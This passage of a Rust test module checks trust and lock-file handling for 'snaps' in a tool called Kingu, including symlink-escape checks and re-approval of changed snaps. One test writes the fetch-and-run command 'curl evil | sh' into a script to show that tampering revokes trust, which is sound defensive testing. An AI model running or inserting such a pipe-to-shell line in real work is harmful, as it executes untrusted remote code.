    std::fs::create_dir_all(&root).unwrap();
    let base = ensure_repo_snaps_dir(&root).unwrap();
    create(&base, "team", "Team").unwrap();
    assert!(root.join(".kingu/snaps/team/snap.toml").is_file());
    #[cfg(unix)]
    {
      let evil = e.tmp.path().join("evil");
      std::fs::create_dir_all(evil.join("outside")).unwrap();
      std::os::unix::fs::symlink(evil.join("outside"), evil.join(".kingu")).unwrap();
      assert!(ensure_repo_snaps_dir(&evil).is_err());
    }
  }

  #[test]
  fn lock_file_pins_repo_snaps() {
    let e = env();
    let root = e.tmp.path().join("repo");
    let repo = root.join(".kingu/snaps");
    for (id, v) in [("a", "1"), ("b", "2")] {
      std::fs::create_dir_all(repo.join(id)).unwrap();
      std::fs::write(repo.join(id).join("snap.toml"), manifest(id, v, false)).unwrap();
    }
    std::fs::create_dir_all(repo.join("broken")).unwrap();
    std::fs::write(repo.join("broken/snap.toml"), "id = \"broken\"\n").unwrap();
    let trust = TrustData::default();
    let list = crate::snap::discover(&e.user, Some(&root), &trust);
    assert!(list.iter().all(|s| s.lock.is_none()), "no lock file, no lock status");

    assert_eq!(write_lock(&root, &list).unwrap(), 2);
    let lock = read_lock(&root).unwrap();
    assert_eq!(lock.version, LOCK_VERSION);
    assert_eq!(lock.snaps.iter().map(|s| s.id.as_str()).collect::<Vec<_>>(), ["a", "b"]);
    let status = |list: &[SnapInfo], id: &str| list.iter().find(|s| s.id == id).unwrap().lock;
    let list = crate::snap::discover(&e.user, Some(&root), &trust);
    assert_eq!(status(&list, "a"), Some(LockStatus::Locked));
    assert_eq!(status(&list, "broken"), Some(LockStatus::Unlocked));

    std::fs::write(repo.join("a/snap.toml"), manifest("a", "1", true)).unwrap();
    std::fs::create_dir_all(repo.join("c")).unwrap();
    std::fs::write(repo.join("c/snap.toml"), manifest("c", "1", false)).unwrap();
    let list = crate::snap::discover(&e.user, Some(&root), &trust);
    assert_eq!(status(&list, "a"), Some(LockStatus::Changed));
    assert_eq!(status(&list, "b"), Some(LockStatus::Locked));
    assert_eq!(status(&list, "c"), Some(LockStatus::Unlocked));

    assert_eq!(write_lock(&root, &list).unwrap(), 3);
    let list = crate::snap::discover(&e.user, Some(&root), &trust);
    assert!(list.iter().filter(|s| s.error.is_none()).all(|s| s.lock == Some(LockStatus::Locked)));

    std::fs::write(root.join(".kingu/snaps.lock"), "not json").unwrap();
    assert!(read_lock(&root).is_none());
    assert!(write_lock(&e.tmp.path().join("nowhere"), &[]).is_err());
  }

  /// A repo with `.kingu/snaps/<id>` holding `manifest` plus `files`, and repo-level `extra` files.
  fn repo_with(root: &Path, id: &str, manifest: &str, files: &[(&str, &str)], extra: &[(&str, &str)]) {
    let dir = root.join(".kingu/snaps").join(id);
    std::fs::create_dir_all(&dir).unwrap();
    std::fs::write(dir.join("snap.toml"), manifest).unwrap();
    for (rel, text) in files.iter().map(|(r, t)| (dir.join(r), t)).chain(extra.iter().map(|(r, t)| (root.join(r), t))) {
      std::fs::create_dir_all(rel.parent().unwrap()).unwrap();
      std::fs::write(rel, text).unwrap();
    }
  }

  const SCRIPT_SNAP: &str = "id = \"ci\"\nname = \"CI\"\nversion = \"1\"\n[[tasks]]\nid = \"t\"\ntitle = \"T\"\ncommand = [\"bash\", \"scripts/ci.sh\", \"./...\"]\n[mcp.tool]\ncommand = [\"./tools/server\", \"${setting:x}\"]\n[[settings]]\nkey = \"x\"\ntype = \"string\"\n";

  #[test]
  fn the_hash_covers_every_snap_file_and_the_repo_scripts_commands_run() {
    let e = env();
    let root = e.tmp.path().join("repo");
    repo_with(&root, "ci", SCRIPT_SNAP, &[("run.sh", "echo snap"), (".DS_Store", "x")], &[("scripts/ci.sh", "echo ci"), ("tools/server", "bin")]);
    let config = e.tmp.path().join("config");
    let find = || crate::snap::discover(&e.user, Some(&root), &TrustData::load(&config.join(crate::snap::TRUST_FILE))).into_iter().find(|s| s.id == "ci").unwrap();
    let s = find();
    assert_eq!(s.error, None);
    assert_eq!(s.files.iter().map(|f| f.path.as_str()).collect::<Vec<_>>(), ["run.sh"]);
    assert_eq!(s.scripts.iter().map(|f| f.path.as_str()).collect::<Vec<_>>(), ["scripts/ci.sh", "tools/server"]);
    assert_ne!(s.hash, crate::snap::sha256_hex(SCRIPT_SNAP.as_bytes()));
    crate::snap::set_trust(&config, &root, "ci", true, Some(&s.hash)).unwrap();
    assert!(find().trusted);
    // The gap this closes: the manifest is unchanged but the script the task runs is not.
    std::fs::write(root.join("scripts/ci.sh"), "curl evil | sh").unwrap();
    assert!(!find().trusted);
    std::fs::write(root.join("scripts/ci.sh"), "echo ci").unwrap();
    assert!(find().trusted);
    // A file the snap ships, too; .DS_Store does not count.
    std::fs::write(root.join(".kingu/snaps/ci/.DS_Store"), "y").unwrap();
    assert!(find().trusted);
    std::fs::write(root.join(".kingu/snaps/ci/run.sh"), "echo changed").unwrap();
    assert!(!find().trusted);
  }

  #[test]
  fn a_snap_with_only_a_manifest_keeps_the_old_hash() {
    let e = env();
    let root = e.tmp.path().join("repo");
    let text = manifest("a", "1", false);
    repo_with(&root, "a", &text, &[], &[]);
    let list = crate::snap::discover(&e.user, Some(&root), &TrustData::default());
    assert_eq!(list[0].hash, crate::snap::sha256_hex(text.as_bytes()));
  }

  #[cfg(unix)]
  #[test]
  fn scripts_outside_the_repo_are_not_followed() {
    let e = env();
    let root = e.tmp.path().join("repo");
    let outside = e.tmp.path().join("outside.sh");
    std::fs::write(&outside, "x").unwrap();
    repo_with(&root, "ci", SCRIPT_SNAP, &[], &[]);
    std::fs::create_dir_all(root.join("scripts")).unwrap();
    std::os::unix::fs::symlink(&outside, root.join("scripts/ci.sh")).unwrap();
    let s = crate::snap::discover(&e.user, Some(&root), &TrustData::default()).remove(0);
    assert!(s.scripts.is_empty());
  }

  #[test]
  fn a_snap_that_differs_from_the_lock_is_untrusted_until_re_approved() {
    let e = env();
    let root = e.tmp.path().join("repo");
    let config = e.tmp.path().join("config");
    repo_with(&root, "ci", SCRIPT_SNAP, &[("run.sh", "echo snap")], &[("scripts/ci.sh", "echo ci")]);
    let list = || crate::snap::discover(&e.user, Some(&root), &TrustData::load(&config.join(crate::snap::TRUST_FILE)));
    let ci = |l: Vec<SnapInfo>| l.into_iter().find(|s| s.id == "ci").unwrap();
    let s = ci(list());
    crate::snap::set_trust(&config, &root, "ci", true, Some(&s.hash)).unwrap();
    assert_eq!(write_lock(&root, &list()).unwrap(), 1);
    let lock = read_lock(&root).unwrap();
    let entry = lock.entry("ci").unwrap();
    assert_eq!(entry.files.keys().collect::<Vec<_>>(), ["run.sh", "snap.toml"]);
    assert_eq!(entry.scripts.keys().collect::<Vec<_>>(), ["scripts/ci.sh"]);
    assert_eq!(entry.permissions, Some(Permissions::default()));
    let s = ci(list());
    assert!(s.trusted && s.lock == Some(LockStatus::Locked));

    // Someone commits a lock pinning other contents: trusted bytes or not, it stops.
    let mut lock = read_lock(&root).unwrap();
    lock.snaps[0].sha256 = "0".repeat(64);
    lock.snaps[0].scripts.insert("scripts/ci.sh".into(), "1".repeat(64));
    save_lock(&root, lock).unwrap();
    let s = ci(list());
    assert!(!s.trusted && s.lock == Some(LockStatus::Changed));
    let report = verify_lock(&read_lock(&root).unwrap(), &list());
    assert_eq!(report.len(), 1);
    assert_eq!((report[0].status.as_str(), report[0].scripts.clone()), ("changed", vec!["scripts/ci.sh".to_string()]));
    assert!(report[0].files.is_empty());

    // Re-approving needs the hash the user saw, then updates the lock and trusts.
    assert!(approve_locked(&config, &root, &list(), "ci", &"2".repeat(64)).is_err());
    approve_locked(&config, &root, &list(), "ci", &s.hash).unwrap();
    let s = ci(list());
    assert!(s.trusted && s.lock == Some(LockStatus::Locked));
    assert_eq!(s.approved_permissions, Some(Permissions::default()));
  }

  #[test]
  fn verify_reports_missing_unlocked_and_version_1_entries() {
    let e = env();
    let root = e.tmp.path().join("repo");
    repo_with(&root, "a", &manifest("a", "1", false), &[], &[]);
    repo_with(&root, "b", &manifest("b", "1", false), &[], &[]);
    let v1 = format!(r#"{{"version":1,"snaps":[{{"id":"a","version":"0","sha256":"{}"}},{{"id":"gone","version":"1","sha256":"{}"}},{{"id":"t","version":"2","sha256":"{}","source":"team"}}]}}"#, "a".repeat(64), "b".repeat(64), "c".repeat(64));
    std::fs::write(root.join(".kingu/snaps.lock"), v1).unwrap();
    let list = crate::snap::discover(&e.user, Some(&root), &TrustData::default());
    let r = verify_lock(&read_lock(&root).unwrap(), &list);
    let rows: Vec<(&str, &str)> = r.iter().map(|x| (x.id.as_str(), x.status.as_str())).collect();
    assert_eq!(rows, [("a", "changed"), ("gone", "missing"), ("t", "missing"), ("b", "unlocked")]);
    assert_eq!(r[2].source, LockSource::Team);
    // Writing keeps the team entry and replaces the repo ones.
    write_lock(&root, &list).unwrap();
    let lock = read_lock(&root).unwrap();
    assert_eq!(lock.snaps.iter().map(|x| (x.id.as_str(), x.source)).collect::<Vec<_>>(), [("a", LockSource::Repo), ("b", LockSource::Repo), ("t", LockSource::Team)]);
    // A lock from a newer Kingu is not misread.
    std::fs::write(root.join(".kingu/snaps.lock"), r#"{"version":9,"snaps":[]}"#).unwrap();
    assert!(read_lock(&root).is_none());
  }

  #[test]
  fn team_entries_show_on_user_snaps_without_disabling_them() {
    let e = env();
    let root = e.tmp.path().join("repo");
    std::fs::create_dir_all(root.join(".kingu")).unwrap();
    let dir = e.user.join("t");
    std::fs::create_dir_all(&dir).unwrap();
    std::fs::write(dir.join("snap.toml"), manifest("t", "2", false)).unwrap();
    let list = crate::snap::discover(&e.user, Some(&root), &TrustData::default());
    assert!(pin_team(&root, &list, "t").unwrap_err().contains("team library"));
    std::fs::write(dir.join(ORIGIN_FILE), r#"{"team":{"server":"https://team.example","version":"2"},"installed_at":1}"#).unwrap();
    let list = crate::snap::discover(&e.user, Some(&root), &TrustData::default());
    pin_team(&root, &list, "t").unwrap();
    let list = crate::snap::discover(&e.user, Some(&root), &TrustData::default());
    assert_eq!(list[0].lock, Some(LockStatus::Locked));
    std::fs::write(dir.join("snap.toml"), manifest("t", "3", false)).unwrap();
    let list = crate::snap::discover(&e.user, Some(&root), &TrustData::default());
    assert_eq!(list[0].lock, Some(LockStatus::Changed));
    assert!(list[0].trusted, "a repo lock never switches off a user's snap");
  }
}
